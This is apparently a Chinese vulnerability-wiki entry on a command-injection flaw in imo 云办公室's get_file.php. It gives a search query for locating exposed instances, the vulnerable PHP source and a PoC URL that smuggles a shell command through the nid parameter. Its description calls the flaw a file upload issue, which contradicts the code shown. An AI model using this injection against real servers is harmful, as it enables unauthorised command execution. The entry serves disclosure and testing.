---
title: "imo 云办公室 get_file.php 远程命令执行漏洞"
date: 2026-10-16 09:09:53
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "imo-云办公室"
tags:
  - "imo-云办公室"
  - "命令执行"
  - "漏洞复现"
---
## 漏洞描述

imo 云办公室 /file/NDisk/get_file.php 过滤不严格导致允许无限制地上传文件，攻击者可以通过该漏洞直接获取网站权限。

## 漏洞影响

```
imo 云办公室
```

## 网络测绘

```
app="iMO-云办公室"
```

## 漏洞复现

登录页面

![image-20220524171455819](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205241720834.png)

漏洞文件 get_file.php

```
<?php
// 放置在 mfs 服务器上用于获取文件列表，配合 nd_verify_large_file.php 使用
if(empty($_GET['cid']) || empty($_GET['nid']))
	exit;
$cid = $_GET['cid'];
$nid = $_GET['nid'];
$mainDir = dirname(__FILE__) . '/../upload/NDiskData/normal/' . $cid . '/';
exec("ls {$mainDir}*_{$nid}_*", $r);
$ret = array();
foreach($r as $v)
	$ret[md5_file($v)] = str_replace(dirname(__FILE__) . "/../upload/NDiskData/normal/{$cid}/", '', $v);
echo json_encode($ret);
```

验证POC

```
/file/NDisk/get_file.php?cid=1&nid=;pwd;
```

![image-20220524172138053](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205241721104.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/imo-%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4-get_file.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
